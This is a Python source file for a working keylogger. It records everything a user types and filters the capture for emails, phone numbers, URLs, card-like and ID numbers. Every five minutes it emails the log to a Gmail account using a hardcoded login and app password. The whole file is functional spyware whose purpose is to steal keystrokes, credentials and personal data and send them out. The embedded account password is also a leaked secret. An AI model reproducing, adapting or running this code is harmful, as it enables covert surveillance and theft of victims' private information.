import os
import time
import keyboard
import re
import threading
from collections import Counter
from queue import Queue
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# ===================================================== File Existence Handling =====================================================


def check_and_create_file(file_path, retries=3, delay=2):
    for attempt in range(retries):
        if not os.path.exists(file_path):
            with open(file_path, "w") as file:
                file.write("")  # Create an empty file
            print(f"Created missing file: {file_path}")

        if os.path.exists(file_path):
            print(f"File is present: {file_path}")
            return True
        else:
            print(
                f"File not found or created: {file_path}. Retrying {attempt + 1}/{retries}..."
            )
            time.sleep(delay)

    print(f"Failed to ensure the file exists: {file_path}")
    return False


# ===================================================== Basic keylogger ================================================

path = os.path.abspath("keysniffer_data.txt")
key_data_queue = Queue()  # Queue to store keypresses for filtering


def keylogger():
    try:
        while True:
            events = keyboard.record("enter")  # Record until "enter" key is pressed
            typed_text = list(keyboard.get_typed_strings(events))
            key_data_queue.put(typed_text[0])  # Put the recorded text into the queue
            time.sleep(0.1)  # Small delay to avoid overloading the system
    except KeyboardInterrupt:
        print("Keylogger stopped.")


# ===================================================== Filter and Extract Valuable Info ====================================


def extract_valuable_info(keysniffer_data):
    extracted_data = {
        "emails": [],
        "phone_numbers": [],
        "urls": [],
        "credit_cards": [],
        "ip_addresses": [],
        "dates": [],
        "social_security_numbers": [],
        "common_words": [],
    }

    # Define patterns for valuable information
    patterns = {
        "emails": r"[\w.-]+@(gmail\.com|hotmail\.com)",
        "phone_numbers": r"\+?(\d{1,3}[- ]?)?(\d{9,})",
        "urls": r"https?://[\w.-]+(?:\.[\w.-]+)+[/\w.-]*",
        "credit_cards": r"\bLU\d{18}\b",
        "ip_addresses": r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
        "dates": r"\b(?:\d{2}[-/.]?\d{2}[-/.]?\d{4})\b",
        "social_security_numbers": r"\b\d{13}\b",
    }

    # Ensure the separator is added only once
    has_separator = False

    while True:
        if not key_data_queue.empty():
            data = key_data_queue.get()  # Get raw data from the queue

            # Write raw data to the file
            with open(keysniffer_data, "a") as file:
                file.write(data + "\n")

            # Add separator if it's not already present
            if not has_separator:
                with open(keysniffer_data, "a") as file:
                    file.write("\n========================\n")
                has_separator = True

            # Extract filtered information
            for key, pattern in patterns.items():
                matches = re.findall(pattern, data)
                extracted_data[key].extend(matches)

            # Write filtered data below the separator
            with open(keysniffer_data, "a") as file:
                file.write("\nFiltered Data:\n")
                for category, items in extracted_data.items():
                    file.write(f"{category.capitalize()}:\n")
                    for item in items:
                        file.write(f"  {item}\n")
                file.write("\n")

            # Clear extracted data
            extracted_data = {key: [] for key in extracted_data}

        time.sleep(1)  # Small delay to avoid overloading the system


# ===================================================== Sending the Filtered Data via Email ====================================

sender_email = "7unkym0nk3y@gmail.com"
receiver_email = "7unkym0nk3y@gmail.com"
keysniffer_data_file = "keysniffer_data.txt"


def send_email():
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "File Attachment: keysniffer_data.txt"

    email_body = """<html><body><p>Please find the attached file containing keylogger data and filtered data.</p></body></html>"""
    message.attach(MIMEText(email_body, "html"))

    with open(keysniffer_data_file, "rb") as file:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition", f"attachment; filename={keysniffer_data_file}"
        )
        message.attach(part)

    try:
        with smtplib.SMTP("smtp.gmail.com:587") as server:
            server.starttls()
            server.login(sender_email, "ixtzymqtphizlcet")
            server.sendmail(sender_email, receiver_email, message.as_string())
            print("Email sent successfully.")

    except Exception as e:
        print(f"An error occurred: {e}")


def send_email_periodically():
    while True:
        send_email()
        time.sleep(300)  # Send email every 5 minutes


# ===================================================== Running the Program ======================================================

if __name__ == "__main__":
    if check_and_create_file("keysniffer_data.txt"):
        try:
            keylogger_thread = threading.Thread(target=keylogger, daemon=True)
            filter_thread = threading.Thread(
                target=extract_valuable_info, daemon=True, args=("keysniffer_data.txt",)
            )
            email_thread = threading.Thread(target=send_email_periodically, daemon=True)

            keylogger_thread.start()
            filter_thread.start()
            email_thread.start()

            keylogger_thread.join()
            filter_thread.join()
            email_thread.join()

        except KeyboardInterrupt:
            print("Program stopped.")
